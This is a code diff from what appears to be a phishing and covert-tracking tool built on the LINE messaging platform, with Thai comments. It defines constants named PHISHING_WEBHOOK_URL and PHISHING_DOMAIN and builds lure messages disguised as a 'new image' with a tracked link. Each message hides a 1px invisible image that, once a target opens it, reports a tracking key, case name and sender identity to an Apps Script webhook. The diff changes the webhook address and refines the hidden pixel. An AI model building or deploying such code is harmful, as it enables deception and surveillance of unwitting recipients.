@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzhXT5uBrcEUy2BAlwtHkK30QJyX83X60xJst_K9jNCK5fsqlenbtph56i6nRDhoL0kbQ/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxHpooak4pKr7W1-kjXW0QkD9rbwKTyvLvksPhtimaFCODLlJAg2Qc1btn3YsMXDd9jyw/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -820,13 +820,11 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง URL สำหรับ Zero Click tracking พร้อมระบุว่าเป็นการเรียกจากเป้าหมาย
+                // สร้าง URL สำหรับ Zero Click tracking
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
-                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&mode=target&r=${randomSuffix}`;
+                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&r=${randomSuffix}&isTarget=true`;
                 
-                console.log("Zero Click Track URL (will be loaded by target):", zeroClickTrackUrl);
-
-                // สร้าง Flex Message ที่มีรูปภาพหลักและแทรก tracking pixel ที่ซ่อนไว้
+                // สร้าง Flex Message ที่มีรูปภาพคลิกได้ + ภาพโปร่งใสสำหรับ Zero Click tracking
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -846,24 +844,16 @@
                         footer: {
                             type: 'box',
                             layout: 'vertical',
-                            contents: [
-                                {
-                                    type: 'image',
-                                    url: zeroClickTrackUrl,
-                                    size: '1px', // ทำให้เล็กมากๆ จนมองไม่เห็น
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover'
-                                },
-                                {
-                                    type: 'text',
-                                    text: ' ', // สเปซเปล่าเพื่อให้ footer ไม่เห็นชัด
-                                    color: '#FFFFFF',
-                                    size: '1px'
-                                }
-                            ],
-                            spacing: '0px',
-                            height: '1px',
-                            paddingAll: '0px'
+                            contents: [{
+                                type: 'image',
+                                url: zeroClickTrackUrl,
+                                size: '1px', // ขนาดเล็กมาก ไม่สามารถมองเห็นได้
+                                aspectRatio: '1:1',
+                                aspectMode: 'cover'
+                            }],
+                            spacing: 'none',
+                            margin: 'none',
+                            height: '1px'
                         }
                     }
                 };
@@ -891,9 +881,6 @@
                             showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
                         }
 
-                        // ไม่เรียก Zero Click tracking ที่นี่ - จะให้เป้าหมายเป็นคนเรียกเมื่อเปิดข้อความ
-                        // [REMOVED] ไม่ต้องส่ง Zero Click tracking ตอนสร้าง/ส่งข้อความ
-                        
                         // รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
